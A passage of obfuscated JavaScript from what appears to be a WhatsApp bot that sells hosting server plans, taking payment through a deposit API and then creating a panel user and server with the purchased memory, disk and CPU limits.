                    return _0x57ed02[_0x5d4417(0x367) + 'e'](_0xedb653[_0x5d4417(0x9e2)], {
                        'buttons': [{
                                'buttonId': _0x2a5309[_0x5d4417(0x11f2)],
                                'buttonText': { 'displayText': _0x2a5309[_0x5d4417(0x1e5)] },
                                'type': 0x4,
                                'nativeFlowInfo': {
                                    'name': _0x2a5309[_0x5d4417(0xdc6)],
                                    'paramsJson': JSON[_0x5d4417(0x78f)]({
                                        'title': _0x2a5309[_0x5d4417(0xb4d)],
                                        'sections': [{
                                                'title': _0x2a5309[_0x5d4417(0x57a)],
                                                'highlight_label': _0x2a5309[_0x5d4417(0x3b9)],
                                                'rows': [
                                                    {
                                                        'title': _0x2a5309[_0x5d4417(0x6b9)],
                                                        'description': _0x2a5309[_0x5d4417(0xffc)],
                                                        'id': _0x2a5309[_0x5d4417(0xbff)]
                                                    },
                                                    {
                                                        'title': _0x2a5309[_0x5d4417(0x7cc)],
                                                        'description': _0x2a5309[_0x5d4417(0x43e)],
                                                        'id': _0x2a5309[_0x5d4417(0xc10)]
                                                    },
                                                    {
                                                        'title': _0x2a5309[_0x5d4417(0x68f)],
                                                        'description': _0x2a5309[_0x5d4417(0xeca)],
                                                        'id': _0x2a5309[_0x5d4417(0xb44)]
                                                    },
                                                    {
                                                        'title': _0x2a5309[_0x5d4417(0xbbd)],
                                                        'description': _0x2a5309[_0x5d4417(0xfea)],
                                                        'id': _0x2a5309[_0x5d4417(0xb8b)]
                                                    },
                                                    {
                                                        'title': _0x2a5309[_0x5d4417(0x5e3)],
                                                        'description': _0x2a5309[_0x5d4417(0x6d6)],
                                                        'id': _0x2a5309[_0x5d4417(0x42f)]
                                                    },
                                                    {
                                                        'title': _0x2a5309[_0x5d4417(0x1015)],
                                                        'description': _0x2a5309[_0x5d4417(0x119f)],
                                                        'id': _0x2a5309[_0x5d4417(0x8cf)]
                                                    },
                                                    {
                                                        'title': _0x2a5309[_0x5d4417(0xe1d)],
                                                        'description': _0x2a5309[_0x5d4417(0x27c)],
                                                        'id': _0x2a5309[_0x5d4417(0xd11)]
                                                    },
                                                    {
                                                        'title': _0x2a5309[_0x5d4417(0x97a)],
                                                        'description': _0x2a5309[_0x5d4417(0x1bd)],
                                                        'id': _0x2a5309[_0x5d4417(0xaf9)]
                                                    },
                                                    {
                                                        'title': _0x2a5309[_0x5d4417(0x512)],
                                                        'description': _0x2a5309[_0x5d4417(0x90c)],
                                                        'id': _0x2a5309[_0x5d4417(0x4e5)]
                                                    },
                                                    {
                                                        'title': _0x2a5309[_0x5d4417(0x891)],
                                                        'description': _0x2a5309[_0x5d4417(0x957)],
                                                        'id': _0x2a5309[_0x5d4417(0x59c)]
                                                    },
                                                    {
                                                        'title': _0x2a5309[_0x5d4417(0x1c1)],
                                                        'description': _0x2a5309[_0x5d4417(0x10a6)],
                                                        'id': _0x2a5309[_0x5d4417(0xa01)]
                                                    }
                                                ]
                                            }]
                                    })
                                }
                            }],
                        'footer': _0x5d4417(0xee4) + botname,
                        'headerType': 0x1,
                        'viewOnce': !![],
                        'text': _0x2a5309[_0x5d4417(0xb5f)],
                        'contextInfo': {
                            'isForwarded': !![],
                            'mentionedJid': [
                                _0xedb653[_0x5d4417(0xeee)],
                                _0x2a5309[_0x5d4417(0x343)](global[_0x5d4417(0x41d)], _0x2a5309[_0x5d4417(0x11a3)])
                            ]
                        }
                    }, { 'quoted': _0xedb653 });
                let _0x4b4ab2 = {}, _0x2dcece = _0x156b97[_0x5d4417(0xec1) + 'e']();
                if (_0x2a5309[_0x5d4417(0xbb0)](_0x2dcece, _0x2a5309[_0x5d4417(0x8a8)]))
                    _0x4b4ab2[_0x5d4417(0x948)] = _0x2a5309[_0x5d4417(0xdd3)], _0x4b4ab2[_0x5d4417(0xd81)] = _0x2a5309[_0x5d4417(0xdd3)], _0x4b4ab2[_0x5d4417(0x5ce)] = '40', _0x4b4ab2[_0x5d4417(0x4a3)] = _0x2a5309[_0x5d4417(0x1d1)];
                else {
                    if (_0x2a5309[_0x5d4417(0xe0a)](_0x2dcece, _0x2a5309[_0x5d4417(0x636)]))
                        _0x4b4ab2[_0x5d4417(0x948)] = _0x2a5309[_0x5d4417(0xc6f)], _0x4b4ab2[_0x5d4417(0xd81)] = _0x2a5309[_0x5d4417(0xdd3)], _0x4b4ab2[_0x5d4417(0x5ce)] = '60', _0x4b4ab2[_0x5d4417(0x4a3)] = _0x2a5309[_0x5d4417(0xb88)];
                    else {
                        if (_0x2a5309[_0x5d4417(0x5fc)](_0x2dcece, _0x2a5309[_0x5d4417(0x612)]))
                            _0x4b4ab2[_0x5d4417(0x948)] = _0x2a5309[_0x5d4417(0x1d1)], _0x4b4ab2[_0x5d4417(0xd81)] = _0x2a5309[_0x5d4417(0xc6f)], _0x4b4ab2[_0x5d4417(0x5ce)] = '80', _0x4b4ab2[_0x5d4417(0x4a3)] = _0x2a5309[_0x5d4417(0xd59)];
                        else {
                            if (_0x2a5309[_0x5d4417(0x545)](_0x2dcece, _0x2a5309[_0x5d4417(0xd12)]))
                                _0x4b4ab2[_0x5d4417(0x948)] = _0x2a5309[_0x5d4417(0xb88)], _0x4b4ab2[_0x5d4417(0xd81)] = _0x2a5309[_0x5d4417(0xc6f)], _0x4b4ab2[_0x5d4417(0x5ce)] = _0x2a5309[_0x5d4417(0x5f8)], _0x4b4ab2[_0x5d4417(0x4a3)] = _0x2a5309[_0x5d4417(0x67b)];
                            else {
                                if (_0x2a5309[_0x5d4417(0xe7c)](_0x2dcece, _0x2a5309[_0x5d4417(0x10be)]))
                                    _0x4b4ab2[_0x5d4417(0x948)] = _0x2a5309[_0x5d4417(0xd59)], _0x4b4ab2[_0x5d4417(0xd81)] = _0x2a5309[_0x5d4417(0x1d1)], _0x4b4ab2[_0x5d4417(0x5ce)] = _0x2a5309[_0x5d4417(0x6e5)], _0x4b4ab2[_0x5d4417(0x4a3)] = _0x2a5309[_0x5d4417(0xc89)];
                                else {
                                    if (_0x2a5309[_0x5d4417(0xed3)](_0x2dcece, _0x2a5309[_0x5d4417(0xe94)]))
                                        _0x4b4ab2[_0x5d4417(0x948)] = _0x2a5309[_0x5d4417(0x67b)], _0x4b4ab2[_0x5d4417(0xd81)] = _0x2a5309[_0x5d4417(0x1d1)], _0x4b4ab2[_0x5d4417(0x5ce)] = _0x2a5309[_0x5d4417(0xfec)], _0x4b4ab2[_0x5d4417(0x4a3)] = _0x2a5309[_0x5d4417(0xdec)];
                                    else {
                                        if (_0x2a5309[_0x5d4417(0x96f)](_0x2dcece, _0x2a5309[_0x5d4417(0x1141)]))
                                            _0x4b4ab2[_0x5d4417(0x948)] = _0x2a5309[_0x5d4417(0xc89)], _0x4b4ab2[_0x5d4417(0xd81)] = _0x2a5309[_0x5d4417(0xb88)], _0x4b4ab2[_0x5d4417(0x5ce)] = _0x2a5309[_0x5d4417(0x46b)], _0x4b4ab2[_0x5d4417(0x4a3)] = _0x2a5309[_0x5d4417(0x11ed)];
                                        else {
                                            if (_0x2a5309[_0x5d4417(0x929)](_0x2dcece, _0x2a5309[_0x5d4417(0xbd1)]))
                                                _0x4b4ab2[_0x5d4417(0x948)] = _0x2a5309[_0x5d4417(0xdec)], _0x4b4ab2[_0x5d4417(0xd81)] = _0x2a5309[_0x5d4417(0xb88)], _0x4b4ab2[_0x5d4417(0x5ce)] = _0x2a5309[_0x5d4417(0x4d2)], _0x4b4ab2[_0x5d4417(0x4a3)] = _0x2a5309[_0x5d4417(0x111f)];
                                            else {
                                                if (_0x2a5309[_0x5d4417(0xbb9)](_0x2dcece, _0x2a5309[_0x5d4417(0xf56)]))
                                                    _0x4b4ab2[_0x5d4417(0x948)] = _0x2a5309[_0x5d4417(0x11ed)], _0x4b4ab2[_0x5d4417(0xd81)] = _0x2a5309[_0x5d4417(0xd59)], _0x4b4ab2[_0x5d4417(0x5ce)] = _0x2a5309[_0x5d4417(0x596)], _0x4b4ab2[_0x5d4417(0x4a3)] = _0x2a5309[_0x5d4417(0x25a)];
                                                else {
                                                    if (_0x2a5309[_0x5d4417(0x919)](_0x2dcece, _0x2a5309[_0x5d4417(0x914)]))
                                                        _0x4b4ab2[_0x5d4417(0x948)] = _0x2a5309[_0x5d4417(0x111f)], _0x4b4ab2[_0x5d4417(0xd81)] = _0x2a5309[_0x5d4417(0xd59)], _0x4b4ab2[_0x5d4417(0x5ce)] = _0x2a5309[_0x5d4417(0x523)], _0x4b4ab2[_0x5d4417(0x4a3)] = _0x2a5309[_0x5d4417(0x1115)];
                                                    else {
                                                        if (_0x2a5309[_0x5d4417(0xcfd)](_0x2dcece, _0x2a5309[_0x5d4417(0x70e)]) || _0x2a5309[_0x5d4417(0x100a)](_0x2dcece, _0x2a5309[_0x5d4417(0x344)]))
                                                            _0x4b4ab2[_0x5d4417(0x948)] = '0', _0x4b4ab2[_0x5d4417(0xd81)] = '0', _0x4b4ab2[_0x5d4417(0x5ce)] = '0', _0x4b4ab2[_0x5d4417(0x4a3)] = _0x2a5309[_0x5d4417(0x10db)];
                                                        else
                                                            return _0xedb653[_0x5d4417(0x105d)](_0x4417bc);
                                                    }
                                                }
                                            }
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
                const _0x4e5f80 = global[_0x5d4417(0x8cb) + _0x5d4417(0x51f)], _0x482163 = _0x2a5309[_0x5d4417(0x1128)](_0x2a5309[_0x5d4417(0xc5f)](Number, _0x4b4ab2[_0x5d4417(0x4a3)]), _0x2a5309[_0x5d4417(0xfaf)](_0x2ac61a, -0xd11 * 0x2 + 0x1 * 0x1bd9 + -0x149, 0x1ae7 + 0x85d + -0x85 * 0x42)), _0x36c143 = await axios[_0x5d4417(0x29d)](_0x5d4417(0xb54) + _0x5d4417(0x3ec) + _0x5d4417(0x1161) + _0x5d4417(0x11b4) + _0x5d4417(0x11dd) + _0x5d4417(0x105e) + global[_0x5d4417(0xa1a) + 'ot'] + _0x5d4417(0x236) + _0x482163 + _0x5d4417(0x558) + _0x4e5f80), _0x51ad2a = _0x5d4417(0x733) + _0x5d4417(0xe27) + _0x5d4417(0xe0c) + _0x5d4417(0x111c) + _0x36c143[_0x5d4417(0x1059)][_0x5d4417(0x346)][_0x5d4417(0xf8a) + _0x5d4417(0xe81)] + (_0x5d4417(0x94e) + _0x5d4417(0xa1c) + _0x5d4417(0x1061)) + await _0x2a5309[_0x5d4417(0x442)](toIDR, _0x36c143[_0x5d4417(0x1059)][_0x5d4417(0x346)][_0x5d4417(0x237)]) + (_0x5d4417(0x95a) + _0x5d4417(0xdc3) + _0x5d4417(0x621) + _0x5d4417(0x1148) + _0x5d4417(0xac1) + _0x5d4417(0x1d0) + _0x5d4417(0x10b8) + _0x5d4417(0x7a3) + _0x5d4417(0xd2c) + _0x5d4417(0x1a4) + _0x5d4417(0x8d5) + _0x5d4417(0xa61) + _0x5d4417(0x10ac) + _0x5d4417(0x91c) + _0x5d4417(0x1153) + _0x5d4417(0xcb2) + _0x5d4417(0x1003) + _0x5d4417(0x189) + _0x5d4417(0x1153) + _0x5d4417(0x420) + _0x5d4417(0x4f6) + _0x5d4417(0x3df) + _0x5d4417(0x75d) + _0x5d4417(0x1187) + _0x5d4417(0x658) + _0x5d4417(0x113c) + '.\x0a');
                let _0x34ec68 = await _0x57ed02[_0x5d4417(0x367) + 'e'](_0xedb653[_0x5d4417(0x9e2)], {
                    'footer': _0x5d4417(0xee4) + botname,
                    'buttons': [{
                            'buttonId': _0x5d4417(0x758),
                            'buttonText': { 'displayText': _0x2a5309[_0x5d4417(0x644)] },
                            'type': 0x1
                        }],
                    'headerType': 0x1,
                    'viewOnce': !![],
                    'image': { 'url': _0x36c143[_0x5d4417(0x1059)][_0x5d4417(0x346)][_0x5d4417(0xa8a)] },
                    'caption': _0x51ad2a,
                    'contextInfo': { 'mentionedJid': [_0xedb653[_0x5d4417(0xeee)]] }
                });
                db[_0x5d4417(0xf2f)][_0xedb653[_0x5d4417(0xeee)]][_0x5d4417(0x6b7) + _0x5d4417(0x350)] = !![], db[_0x5d4417(0xf2f)][_0xedb653[_0x5d4417(0xeee)]][_0x5d4417(0x7bd)] = {
                    'msg': _0x34ec68,
                    'chat': _0xedb653[_0x5d4417(0xeee)],
                    'idDeposit': _0x36c143[_0x5d4417(0x1059)][_0x5d4417(0x346)][_0x5d4417(0xf8a) + _0x5d4417(0xe81)],
                    'amount': _0x36c143[_0x5d4417(0x1059)][_0x5d4417(0x346)][_0x5d4417(0x237)][_0x5d4417(0xef4)](),
                    'exp': function () {
                        const _0x28270a = _0x5d4417;
                        _0x2a5309[_0x28270a(0x736)](setTimeout, async () => {
                            const _0x371f88 = _0x28270a;
                            if (_0x2a5309[_0x371f88(0x1df)](db[_0x371f88(0xf2f)][_0xedb653[_0x371f88(0xeee)]][_0x371f88(0x6b7) + _0x371f88(0x350)], !![]) && db[_0x371f88(0xf2f)][_0xedb653[_0x371f88(0xeee)]][_0x371f88(0x7bd)] && _0x2a5309[_0x371f88(0xfa8)](db[_0x371f88(0xf2f)][_0xedb653[_0x371f88(0xeee)]][_0x371f88(0x7bd)][_0x371f88(0x237)], db[_0x371f88(0xf2f)][_0xedb653[_0x371f88(0xeee)]][_0x371f88(0x7bd)][_0x371f88(0x237)])) {
                                const _0x2f922c = _0x2a5309[_0x371f88(0x676)][_0x371f88(0xc6c)]('|');
                                let _0x38650f = 0xa4a + -0x2b * 0x8b + 0xd0f;
                                while (!![]) {
                                    switch (_0x2f922c[_0x38650f++]) {
                                    case '0':
                                        await _0x57ed02[_0x371f88(0x367) + 'e'](db[_0x371f88(0xf2f)][_0xedb653[_0x371f88(0xeee)]][_0x371f88(0x7bd)][_0x371f88(0x9e2)], { 'delete': db[_0x371f88(0xf2f)][_0xedb653[_0x371f88(0xeee)]][_0x371f88(0x7bd)][_0x371f88(0x10e8)][_0x371f88(0x1185)] });
                                        continue;
                                    case '1':
                                        delete db[_0x371f88(0xf2f)][_0xedb653[_0x371f88(0xeee)]][_0x371f88(0x7bd)];
                                        continue;
                                    case '2':
                                        await _0x2a5309[_0x371f88(0x53a)](clearInterval, db[_0x371f88(0xf2f)][_0xedb653[_0x371f88(0xeee)]][_0x371f88(0x7bd)][_0x371f88(0x782)]);
                                        continue;
                                    case '3':
                                        await _0x57ed02[_0x371f88(0x367) + 'e'](db[_0x371f88(0xf2f)][_0xedb653[_0x371f88(0xeee)]][_0x371f88(0x7bd)][_0x371f88(0x9e2)], { 'text': _0x2a5309[_0x371f88(0xb95)] }, { 'quoted': db[_0x371f88(0xf2f)][_0xedb653[_0x371f88(0xeee)]][_0x371f88(0x7bd)][_0x371f88(0x10e8)] });
                                        continue;
                                    case '4':
                                        db[_0x371f88(0xf2f)][_0xedb653[_0x371f88(0xeee)]][_0x371f88(0x6b7) + _0x371f88(0x350)] = ![];
                                        continue;
                                    }
                                    break;
                                }
                            }
                        }, 0x6df01 * -0x1 + 0x72b72 + 0x4476f);
                    }
                }, await db[_0x5d4417(0xf2f)][_0xedb653[_0x5d4417(0xeee)]][_0x5d4417(0x7bd)][_0x5d4417(0x782)]();
                while (_0x2a5309[_0x5d4417(0xdb7)](db[_0x5d4417(0xf2f)][_0xedb653[_0x5d4417(0xeee)]][_0x5d4417(0x6b7) + _0x5d4417(0x350)], !![]) && db[_0x5d4417(0xf2f)][_0xedb653[_0x5d4417(0xeee)]][_0x5d4417(0x7bd)] && db[_0x5d4417(0xf2f)][_0xedb653[_0x5d4417(0xeee)]][_0x5d4417(0x7bd)][_0x5d4417(0x237)]) {
                    await _0x2a5309[_0x5d4417(0x501)](sleep, -0x59 * 0x65 + -0x3305 + 0x177a * 0x5);
                    const _0x29dd6b = await axios[_0x5d4417(0x29d)](_0x5d4417(0xb54) + _0x5d4417(0x3ec) + _0x5d4417(0x1161) + _0x5d4417(0x1b5) + _0x5d4417(0xb96) + _0x5d4417(0xea7) + global[_0x5d4417(0xa1a) + 'ot'] + _0x5d4417(0xdfc) + global[_0x5d4417(0xc77) + _0x5d4417(0xaab)] + _0x5d4417(0x8e3) + global[_0x5d4417(0x1145) + _0x5d4417(0x9af)]), _0x2560c6 = await _0x29dd6b[_0x5d4417(0x1059)];
                    if (db[_0x5d4417(0xf2f)][_0xedb653[_0x5d4417(0xeee)]][_0x5d4417(0x7bd)] && _0x2a5309[_0x5d4417(0x96f)](_0x2560c6?.[_0x5d4417(0x237)], db[_0x5d4417(0xf2f)][_0xedb653[_0x5d4417(0xeee)]][_0x5d4417(0x7bd)][_0x5d4417(0x237)])) {
                        db[_0x5d4417(0xf2f)][_0xedb653[_0x5d4417(0xeee)]][_0x5d4417(0x6b7) + _0x5d4417(0x350)] = ![], await _0x2a5309[_0x5d4417(0xea8)](clearInterval, db[_0x5d4417(0xf2f)][_0xedb653[_0x5d4417(0xeee)]][_0x5d4417(0x7bd)][_0x5d4417(0x782)]), await _0x57ed02[_0x5d4417(0x367) + 'e'](db[_0x5d4417(0xf2f)][_0xedb653[_0x5d4417(0xeee)]][_0x5d4417(0x7bd)][_0x5d4417(0x9e2)], { 'text': _0x5d4417(0x8db) + _0x5d4417(0x78a) + _0x5d4417(0x5a1) + _0x5d4417(0x6d9) + _0x5d4417(0x191) + db[_0x5d4417(0xf2f)][_0xedb653[_0x5d4417(0xeee)]][_0x5d4417(0x7bd)][_0x5d4417(0xf1d)] + (_0x5d4417(0x94e) + _0x5d4417(0xa1c) + _0x5d4417(0x1061)) + await _0x2a5309[_0x5d4417(0xa92)](toIDR, db[_0x5d4417(0xf2f)][_0xedb653[_0x5d4417(0xeee)]][_0x5d4417(0x7bd)][_0x5d4417(0x237)]) + (_0x5d4417(0x95a) + _0x5d4417(0xdc3) + _0x5d4417(0x621) + _0x5d4417(0x54c)) }, { 'quoted': db[_0x5d4417(0xf2f)][_0xedb653[_0x5d4417(0xeee)]][_0x5d4417(0x7bd)][_0x5d4417(0x10e8)] });
                        let _0x41a3be = crypto[_0x5d4417(0xda8) + 's'](0x133 * 0xd + -0x2 * -0x233 + 0x13f9 * -0x1)[_0x5d4417(0xef4)](_0x2a5309[_0x5d4417(0x5c4)]), _0xe3f075 = _0x2a5309[_0x5d4417(0x343)](_0x41a3be, _0x2a5309[_0x5d4417(0x1082)]), _0x490e8a = _0x2a5309[_0x5d4417(0xc90)](_0x2a5309[_0x5d4417(0xb80)](capital, _0x41a3be), _0x2a5309[_0x5d4417(0x865)]), _0x29937e = _0x2a5309[_0x5d4417(0x83c)](_0x41a3be, crypto[_0x5d4417(0xda8) + 's'](-0x2077 * -0x1 + 0x3e * -0x7f + -0x1b3)[_0x5d4417(0xef4)](_0x2a5309[_0x5d4417(0x5c4)])), _0x3603f8 = await _0x2a5309[_0x5d4417(0xfa0)](fetch, _0x2a5309[_0x5d4417(0x2b3)](domain, _0x2a5309[_0x5d4417(0x9d4)]), {
                                'method': _0x2a5309[_0x5d4417(0x3a6)],
                                'headers': {
                                    'Accept': _0x2a5309[_0x5d4417(0xe03)],
                                    'Content-Type': _0x2a5309[_0x5d4417(0xe03)],
                                    'Authorization': _0x2a5309[_0x5d4417(0x215)](_0x2a5309[_0x5d4417(0xbee)], apikey)
                                },
                                'body': JSON[_0x5d4417(0x78f)]({
                                    'email': _0xe3f075,
                                    'username': _0x41a3be[_0x5d4417(0xec1) + 'e'](),
                                    'first_name': _0x490e8a,
                                    'last_name': _0x2a5309[_0x5d4417(0x366)],
                                    'language': 'en',
                                    'password': _0x29937e[_0x5d4417(0xef4)]()
                                })
                            }), _0x56715f = await _0x3603f8[_0x5d4417(0x728)]();
                        if (_0x56715f[_0x5d4417(0x7e1)])
                            return _0xedb653[_0x5d4417(0x105d)](JSON[_0x5d4417(0x78f)](_0x56715f[_0x5d4417(0x7e1)][-0x2468 + -0x349 + 0x9 * 0x469], null, 0xb1f + -0x13a0 + 0x883));
                        let _0x21ba33 = _0x56715f[_0x5d4417(0x7f4)], _0x56f130 = _0x2a5309[_0x5d4417(0xf18)](tanggal, Date[_0x5d4417(0xc8a)]()), _0x2b9278 = _0x21ba33['id'], _0x3bf47f = await _0x2a5309[_0x5d4417(0x845)](fetch, _0x2a5309[_0x5d4417(0x1ed)](_0x2a5309[_0x5d4417(0x616)](domain, _0x5d4417(0x958) + _0x5d4417(0x61c) + _0x5d4417(0x95c) + nestid + _0x5d4417(0x36c)), egg), {
                                'method': _0x2a5309[_0x5d4417(0xea5)],
                                'headers': {
                                    'Accept': _0x2a5309[_0x5d4417(0xe03)],
                                    'Content-Type': _0x2a5309[_0x5d4417(0xe03)],
                                    'Authorization': _0x2a5309[_0x5d4417(0xb17)](_0x2a5309[_0x5d4417(0xbee)], apikey)
                                }
                            }), _0x58ece0 = await _0x3bf47f[_0x5d4417(0x728)](), _0x3d7e95 = _0x58ece0[_0x5d4417(0x7f4)][_0x5d4417(0x7ae)], _0x26f993 = await _0x2a5309[_0x5d4417(0x878)](fetch, _0x2a5309[_0x5d4417(0xc90)](domain, _0x2a5309[_0x5d4417(0x6bf)]), {
                                'method': _0x2a5309[_0x5d4417(0x3a6)],
                                'headers': {
                                    'Accept': _0x2a5309[_0x5d4417(0xe03)],
                                    'Content-Type': _0x2a5309[_0x5d4417(0xe03)],
                                    'Authorization': _0x2a5309[_0x5d4417(0x629)](_0x2a5309[_0x5d4417(0xbee)], apikey)
                                },
                                'body': JSON[_0x5d4417(0x78f)]({
                                    'name': _0x490e8a,
                                    'description': _0x56f130,
                                    'user': _0x2b9278,
                                    'egg': _0x2a5309[_0x5d4417(0x448)](parseInt, egg),
                                    'docker_image': _0x2a5309[_0x5d4417(0x1189)],
                                    'startup': _0x3d7e95,
                                    'environment': {
                                        'INST': _0x2a5309[_0x5d4417(0x483)],
                                        'USER_UPLOAD': '0',
                                        'AUTO_UPDATE': '0',
                                        'CMD_RUN': _0x2a5309[_0x5d4417(0x3bb)]
                                    },
                                    'limits': {
                                        'memory': _0x4b4ab2[_0x5d4417(0x948)],
                                        'swap': 0x0,
                                        'disk': _0x4b4ab2[_0x5d4417(0xd81)],
                                        'io': 0x1f4,
                                        'cpu': _0x4b4ab2[_0x5d4417(0x5ce)]
                                    },
                                    'feature_limits': {
                                        'databases': 0x5,
                                        'backups': 0x5,
                                        'allocations': 0x5
                                    },
                                    'deploy': {
                                        'locations': [_0x2a5309[_0x5d4417(0x656)](parseInt, loc)],
                                        'dedicated_ip': ![],
                                        'port_range': []
                                    }
                                })
                            }), _0x52dd5e = await _0x26f993[_0x5d4417(0x728)]();
                        if (_0x52dd5e[_0x5d4417(0x7e1)])
                            return _0xedb653[_0x5d4417(0x105d)](JSON[_0x5d4417(0x78f)](_0x52dd5e[_0x5d4417(0x7e1)][-0xa * 0x265 + 0x121 * -0x16 + 0x30c8], null, -0x9 * -0x2a0 + -0x1 * -0x16d3 + -0xf7b * 0x3));
                        let _0x44b94b = _0x52dd5e[_0x5d4417(0x7f4)];
                        var _0x16d8bc = db[_0x5d4417(0xf2f)][_0xedb653[_0x5d4417(0xeee)]][_0x5d4417(0x7bd)][_0x5d4417(0x9e2)], _0x381901 = _0x5d4417(0x72a) + _0x5d4417(0x1158) + _0x5d4417(0x6ac) + _0x5d4417(0x104e) + '(' + _0x44b94b['id'] + (_0x5d4417(0xaa0) + _0x5d4417(0x868)) + _0x21ba33[_0x5d4417(0x1104)] + (_0x5d4417(0x5fa) + _0x5d4417(0xb9c)) + _0x29937e + (_0x5d4417(0xa4c) + _0x5d4417(0x8bc) + _0x5d4417(0x32b) + _0x5d4417(0x90b)) + (_0x2a5309[_0x5d4417(0x85a)](_0x4b4ab2[_0x5d4417(0x948)], '0') ? _0x2a5309[_0x5d4417(0xa8b)] : _0x2a5309[_0x5d4417(0x1b3)](_0x4b4ab2[_0x5d4417(0x948)][_0x5d4417(0xc6c)]('')[_0x5d4417(0xf65)], -0xb18 + -0xdbb + -0x18d7 * -0x1) ? _0x2a5309[_0x5d4417(0x1ca)](_0x4b4ab2[_0x5d4417(0x948)][_0x5d4417(0xc6c)]('')[_0x5d4417(0x1019)](-0x1816 + -0x1 * 0x24d3 + 0x1f7 * 0x1f, -0x1 * 0x1521 + 0x2405 + -0xee2)[_0x5d4417(0x8b2)](''), _0x2a5309[_0x5d4417(0x8b8)]) : _0x2a5309[_0x5d4417(0x18f)](_0x4b4ab2[_0x5d4417(0x948)][_0x5d4417(0xff0)](-0x22a3 * -0x1 + -0x25fd + 0x35a), 'GB')) + (_0x5d4417(0xd53) + _0x5d4417(0x109d)) + (_0x2a5309[_0x5d4417(0xb42)](_0x4b4ab2[_0x5d4417(0xd81)], '0') ? _0x2a5309[_0x5d4417(0xa8b)] : _0x2a5309[_0x5d4417(0x666)](_0x4b4ab2[_0x5d4417(0xd81)][_0x5d4417(0xc6c)]('')[_0x5d4417(0xf65)], -0x19be + 0x1a * 0xbc + -0x355 * -0x2) ? _0x2a5309[_0x5d4417(0x452)](_0x4b4ab2[_0x5d4417(0xd81)][_0x5d4417(0xc6c)]('')[_0x5d4417(0x1019)](0xcf3 + -0x59 * 0xe + -0x1 * 0x815, 0x1cba + -0x53 * -0x6d + -0x400f)[_0x5d4417(0x8b2)](''), _0x2a5309[_0x5d4417(0x8b8)]) : _0x2a5309[_0x5d4417(0x1018)](_0x4b4ab2[_0x5d4417(0xd81)][_0x5d4417(0xff0)](0x1 * -0x1075 + -0x3 * -0x3b9 + -0x1 * -0x54a), 'GB')) + (_0x5d4417(0x2cd) + '\x20*') + (_0x2a5309[_0x5d4417(0x309)](_0x4b4ab2[_0x5d4417(0x5ce)], '0') ? _0x2a5309[_0x5d4417(0xa8b)] : _0x2a5309[_0x5d4417(0xb60)](_0x4b4ab2[_0x5d4417(0x5ce)], '%')) + _0x5d4417(0x11ee) + global[_0x5d4417(0xed6)] + (_0x5d4417(0x7c4) + _0x5d4417(0x6b5) + _0x5d4417(0x7c9) + _0x5d4417(0x1070) + _0x5d4417(0x6b0) + _0x5d4417(0x3cf) + _0x5d4417(0x98a) + _0x5d4417(0x72b) + _0x5d4417(0xd04) + _0x5d4417(0x11fb) + _0x5d4417(0x10d6) + _0x5d4417(0x714) + _0x5d4417(0x933) + _0x5d4417(0x63f) + _0x5d4417(0xd50) + _0x5d4417(0x4ba) + _0x5d4417(0xd6c) + _0x5d4417(0xbe9));
                        await fs[_0x5d4417(0xe19) + _0x5d4417(0x6d3)](_0x2a5309[_0x5d4417(0x81f)], _0x381901), await _0x57ed02[_0x5d4417(0x367) + 'e'](_0x16d8bc, {
                            'document': fs[_0x5d4417(0xf73) + 'nc'](_0x2a5309[_0x5d4417(0x81f)]),
                            'fileName': _0x2a5309[_0x5d4417(0x727)],
                            'mimetype': _0x2a5309[_0x5d4417(0x100e)],
                            'caption': _0x381901
                        }, { 'quoted': null }), await fs[_0x5d4417(0xf9e)](_0x2a5309[_0x5d4417(0x81f)]), await _0x57ed02[_0x5d4417(0x367) + 'e'](db[_0x5d4417(0xf2f)][_0xedb653[_0x5d4417(0xeee)]][_0x5d4417(0x7bd)][_0x5d4417(0x9e2)], { 'delete': db[_0x5d4417(0xf2f)][_0xedb653[_0x5d4417(0xeee)]][_0x5d4417(0x7bd)][_0x5d4417(0x10e8)][_0x5d4417(0x1185)] }), delete db[_0x5d4417(0xf2f)][_0xedb653[_0x5d4417(0xeee)]][_0x5d4417(0x7bd)];
                    }
                }
            }
            break;
        case _0x2a5309[_0x5d4417(0xb48)]: {
                if (_0xedb653[_0x5d4417(0xe3e)])
                    return _0xedb653[_0x5d4417(0x105d)](_0x2a5309[_0x5d4417(0x1121)]);
                if (db[_0x5d4417(0xf2f)][_0xedb653[_0x5d4417(0xeee)]][_0x5d4417(0x6b7) + _0x5d4417(0x350)])
                    return _0xedb653[_0x5d4417(0x105d)](_0x2a5309[_0x5d4417(0x3ad)]);
                let _0x583374 = crypto[_0x5d4417(0xda8) + 's'](0x10ab + 0x1 * -0x20ab + 0x1004)[_0x5d4417(0xef4)](_0x2a5309[_0x5d4417(0x5c4)]), _0x13b393 = {};
                _0x13b393[_0x5d4417(0x4a3)] = _0x2a5309[_0x5d4417(0x3f3)], _0x13b393[_0x5d4417(0x1104)] = _0x583374;
                const _0x4263da = global[_0x5d4417(0x8cb) + _0x5d4417(0x51f)], _0xb9329e = _0x2a5309[_0x5d4417(0x118b)](_0x2a5309[_0x5d4417(0x1127)](Number, _0x13b393[_0x5d4417(0x4a3)]), _0x2a5309[_0x5d4417(0x6a9)](_0x2ac61a, -0x550 * 0x7 + -0x1 * -0xfbf + -0xb * -0x1fd, -0x2 * -0xe53 + 0x225e + 0x14ae * -0x3)), _0x137c56 = await axios[_0x5d4417(0x29d)](_0x5d4417(0xb54) + _0x5d4417(0x3ec) + _0x5d4417(0x1161) + _0x5d4417(0x11b4) + _0x5d4417(0x11dd) + _0x5d4417(0x105e) + global[_0x5d4417(0xa1a) + 'ot'] + _0x5d4417(0x236) + _0xb9329e + _0x5d4417(0x558) + _0x4263da), _0x2dedf6 = _0x5d4417(0x733) + _0x5d4417(0xe27) + _0x5d4417(0xe0c) + _0x5d4417(0x111c) + _0x137c56[_0x5d4417(0x1059)][_0x5d4417(0x346)][_0x5d4417(0xf8a) + _0x5d4417(0xe81)] + (_0x5d4417(0x94e) + _0x5d4417(0xa1c) + _0x5d4417(0x1061)) + await _0x2a5309[_0x5d4417(0xccd)](toIDR, _0x137c56[_0x5d4417(0x1059)][_0x5d4417(0x346)][_0x5d4417(0x237)]) + (_0x5d4417(0x95a) + _0x5d4417(0xa97) + _0x5d4417(0x28a) + _0x5d4417(0xa20) + _0x5d4417(0x7df) + _0x5d4417(0x1ac) + _0x5d4417(0x1cd) + _0x5d4417(0xbc7) + _0x5d4417(0xa9d) + _0x5d4417(0x11d6) + _0x5d4417(0x6ba) + _0x5d4417(0x1029) + 